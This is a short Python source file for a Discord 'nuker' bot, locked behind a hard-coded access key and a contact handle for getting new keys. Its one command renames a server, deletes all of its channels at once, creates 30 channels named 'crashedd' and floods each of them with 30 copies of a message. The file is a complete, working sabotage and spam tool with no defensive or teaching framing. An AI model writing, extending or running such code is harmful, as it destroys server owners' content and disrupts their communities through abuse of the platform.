import discord
from discord.ext import commands
import asyncio

intents = discord.Intents.default()
intents.guilds = True
intents.guild_messages = True
intents.message_content = True
intents.members = True


bot = commands.Bot(command_prefix='!', intents=intents)


TOKEN = 'discord bot token here.'
KEY = 'remz'

def verify_key():
    input_key = input("Enter your key to proceed --> ")
    return input_key == KEY

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user}')

@bot.command()
async def skibidi(ctx, new_server_name: str, *, message: str = "Default message"):
    if ctx.guild:

        await ctx.guild.edit(name=new_server_name)


        await asyncio.gather(*(channel.delete() for channel in ctx.guild.channels))


        new_channels = await asyncio.gather(*(ctx.guild.create_text_channel('crashedd') for _ in range(30)))


        await asyncio.gather(*(asyncio.gather(*(channel.send(message) for _ in range(30))) for channel in new_channels))
    else:
        await ctx.send("This command can only be used in a server.")

if verify_key():
    bot.run(TOKEN)
else:
    print("Invalid key. Text itsurboylj on discord for a new key. Press a key to exit the program.")
    input()






    
